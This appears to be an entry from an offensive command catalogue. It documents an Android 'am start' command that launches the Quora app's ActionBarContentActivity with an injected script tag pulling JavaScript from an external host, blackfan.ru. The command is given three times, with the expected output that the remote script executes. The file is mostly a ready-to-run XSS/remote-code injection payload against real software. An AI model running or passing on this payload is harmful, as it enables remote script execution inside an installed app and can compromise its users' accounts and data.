---
data: >-
  am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e
  url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
tags:
  - xss
  - remote-script
type: command
executor: bash
platforms:
  - Android
id: 0234690b-e33f-4cd8-826e-5f6ddc806e75
created_at: '2025-12-13T23:52:44.025Z'
updated_at: '2025-12-13T23:52:44.025Z'
verified: false
validated: true
submitted: true
---
# am-start-actionbar-external-script

## Command

```bash
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

## Description

Starts ActionBarContentActivity with external script source for remote JS execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Component name | Yes |
| -e url | Dummy URL | Yes |
| -e html | Script src payload | Yes |

## Examples

### Basic Usage

```bash
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

## Expected Output

Script loads and executes from blackfan.ru.

## Related

- [[procedures/Launch-Multiple-Quora-Activities-with-External-Script-Source]]
